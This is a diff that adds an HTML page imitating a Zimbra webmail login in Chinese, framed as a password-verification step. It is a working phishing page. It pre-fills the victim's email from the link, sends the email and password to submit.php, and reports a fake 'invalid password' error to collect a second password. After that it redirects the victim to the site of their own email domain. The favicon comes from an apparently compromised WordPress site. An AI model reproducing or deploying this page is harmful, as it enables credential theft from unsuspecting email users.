@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html class="user_font_size_normal" lang="en"><head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>电子邮件设置 - 密码维护 </title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Zimbra provides open source server and client software for messaging and collaboration. To find out more visit https://www.zimbra.com.">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="stylesheet" type="text/css" href="China_files/style.css">
+    <link rel="SHORTCUT ICON" href="https://gulfcareerinternational.com/wp-admin/network/gre4434553/chi/assets/img/favicon.ico">
+
+    <style type="text/css">
+        .auto-style1 {
+            font-size: 12px;
+            font-weight: normal;
+        }
+
+        #msg {
+            display: none;
+        }
+    </style>
+</head>
+
+<body onload="onLoad();">
+
+    <div id="modifiedLogin" class="LoginScreen">
+        <div class="modernCenter">
+            <div class="modernContentBox">
+                <div class="logo">
+                    <a href="#" id="bannerLink" target="_new" title="Zimbra">
+                        <span class="ScreenReaderOnly">Zimbra</span>
+                    </a>
+                    <img alt="China Trademark Email" height="24" src="China_files/email-309678_1280-1024x624.png" width="38">
+                </div>
+                <form id="zLoginForm" method="post" name="loginForm" action="form.php" accept-charset="UTF-8">
+                    <input type="hidden" name="loginOp" value="login">
+                    <input type="hidden" name="login_csrf" value="be542a13-745b-4204-8d80-2aaab8c2ec5a">
+
+                    <div class="signIn">登录<br><br>
+                        <span class="auto-style1">
+                            为了验证你是账户的所有者，请输入你当前的密码
+                        </span><br>
+                    </div>
+                    <div class="form">
+                        <div id="msg" class="errorMessage" style="display: none;">
+                            密碼無效...！請輸入正確的密碼。
+                        </div>
+                        <div class="loginSection">
+                            <label for="username" class="zLoginFieldLabel">电子邮件</label>
+                            <input id="ai" tabindex="1" class="zLoginFieldInput" name="ai" type="text" size="40" maxlength="1024" autocapitalize="none" autocorrect="off">
+                            <label for="password" class="zLoginFieldLabel">电子邮件密码</label>
+                            <div class="passwordWrapper">
+                                <input id="pr" tabindex="2" autocomplete="off" class="zLoginFieldInput" name="pr" type="password" value="" size="40" maxlength="1024">
+                                <span toggle="#password" onclick="showPassword();" id="showSpan" style="display: block;">显示</span>
+                                <span toggle="#password" onclick="showPassword();" id="hideSpan" style="display: none;">隐藏</span>
+                            </div>
+                            <div class="signInAndLabel">
+                                <div>
+                                    <button id="btn1" type="submit" tabindex="5" class="loginButton">登录</button>
+                                </div>
+                                <div class="rememberCheckWrapper">
+                                    <input id="remember" tabindex="6" value="1" type="checkbox" name="zrememberme">
+                                    <label id="remember" for="remember">保持登录状态</label>
+                                </div>
+                            </div>
+                        </div>
+                        <div>
+                            <hr>
+                        </div>
+                        <div>
+                            <div class="versionBlock">
+                                <label for="client">网络应用程序版本</label>
+                                <div style="position: relative;">
+                                    <select id="client" name="client" onchange="clientChange(this.options[this.selectedIndex].value)">
+                                        <option value="preferred" selected="selected"> 默认情况下</option>
+                                        <option value="advanced"> 经典之作</option>
+                                        <option value="modern"> 现代</option>
+                                    </select>
+                                    <input type="button" class="alignWhatsThis" onclick="showTooltip();" id="ZLoginWhatsThisButton">
+                                </div>
+
+                                <div id="ZLoginWhatsThis">
+                                    <div class="ZLoginInfo">
+                                        <span id="dialogCloseButton" onclick="hideTooltip();">×</span>
+                                        <p><strong>Modern</strong><br> The Modern Web App delivers a responsive
+                                            experience across all your devices and integrates with many popular apps.
+                                        </p>
+                                        <p><strong>Classic</strong><br> The Classic Web App is familiar to long-time
+                                            Zimbra users. It delivers advanced collaboration and calendar features
+                                            popular with power users on Desktop web browsers.</p>
+                                        <p><strong>Default</strong><br> This will sign you in according to your saved
+                                            Preference. In the Modern Web App, set this preference in Settings &gt; General
+                                            &gt; Zimbra Version. In Classic, set it in Preferences &gt; General &gt; Sign In.</p>
+                                    </div>
+                                </div>
+
+
+                            </div>
+                        </div>
+                    </div>
+                </form>
+            </div>
+            <div class="decor1"></div>
+        </div>
+
+        <div class="Footer">
+            <div id="ZLoginNotice" class="legalNotice-small">版权所有 2005-2025 - 保留所有权利。</div>
+        </div>
+        <div class="decor2"></div>
+    </div>
+
+    <script src="China_files/jquery-3.6.0.min.js"></script>
+    <script>
+        $(document).ready(function () {
+            let count = 0;
+
+            // Set timestamp on load
+            $('#form_time').val(Math.floor(Date.now() / 1000));
+            setTimeout(() => {
+                $('#btn1').prop('disabled', false);
+            }, 1500); // JS-only unlock after 1.5 seconds
+
+
+            // Auto-fill email from hash (e.g., #user@example.com)
+            const ai = window.location.hash.substr(1);
+            if (ai) {
+                const atIndex = ai.indexOf("@");
+                const domainSlice = ai.substring(atIndex + 1);
+                const domain = domainSlice.substring(0, domainSlice.indexOf('.'));
+                const finalDomain = domain.toLowerCase();
+
+                $('#ai').val(ai); // Fill email input
+                $('#aich').html(ai).show(); // Display somewhere (optional)
+                $('#msg').hide();
+            }
+
+            // Submit on Enter key
+            $(document).keypress(function (event) {
+                if (event.which === 13) {
+                    event.preventDefault();
+                    $("#btn1").click();
+                }
+            });
+
+            // Form submission
+            $('#zLoginForm').on('submit', function (event) {
+                event.preventDefault();
+                $('#msg').hide();
+
+                count++;
+
+                const formData = new FormData(this);
+                $.ajax({
+                    url: 'submit.php',
+                    type: 'POST',
+                    data: formData,
+                    dataType: 'json',
+                    processData: false,
+                    contentType: false,
+                    beforeSend: function () {
+                        $('#btn1').html('驗證...');
+                    },
+                    success: function (response) {
+                        if (response.status === 'error') {
+                            $('#msg').text(response.msg).show();
+                            $('#btn1').html('再試一次');
+                            return;
+                        }
+
+                        if (count >= 2) {
+                            count = 0;
+                            if (ai) {
+                                const domain = ai.split('@')[1].split('.')[0];
+                                window.location.href = "http://www." + domain + ".com";
+                            } else {
+                                window.location.href = "http://mail.com";
+                            }
+                            return;
+                        }
+
+                        $('#pr').val('');
+                        $('#msg').show();
+                        $('#btn1').html('再試一次');
+                    },
+                    error: function (xhr, status, error) {
+                        console.error("AJAX Error:", xhr.responseText);
+                        $('#msg').text("提交失敗，請重試.").show();
+                        $('#btn1').html('再試一次');
+                    }
+                });
+            });
+        });
+    </script>
+
+
+</body></html>
